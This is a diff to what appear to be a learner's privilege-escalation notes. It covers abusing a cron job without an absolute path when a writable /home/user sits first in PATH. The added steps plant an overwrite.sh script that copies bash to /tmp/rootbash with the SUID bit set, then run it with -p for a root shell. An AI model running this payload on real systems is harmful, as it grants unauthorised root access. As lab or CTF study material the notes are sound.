@@ -18,10 +18,17 @@ The system-wide crontab is located at `/etc/crontab`
 
 ##### PATH Environment Variable
 
-- the system will check the directory locations in the path variable sequentially for cronjobs
-- view the contents of the system-wide crontab - `cat /etc/crontab`
-- Note that the `/home/user` directory (which we can write to) is at the start of the PATH variable, and the first cron job does not use an absolute path
-
+- The system will check the directory locations in the path variable sequentially for cronjobs
+1. view the contents of the system-wide crontab - `cat /etc/crontab`
+2. Note that the `/home/user` directory (which we can write to) is at the start of the PATH variable, and the first cron job does not use an absolute path
+3. Create the file overwrite.sh in `/home/user` with the [[rootbash]]:
+```
+	#!/bin/bash 
+	cp /bin/bash /tmp/rootbash 
+	chmod +s /tmp/rootbash
+```
+4. Ensure that overwrite.sh is executable
+5. Once the `/tmp/rootbash` file is created, execute it (with -p to preserve the effective UID) to gain a root shell
 
 
 ### References
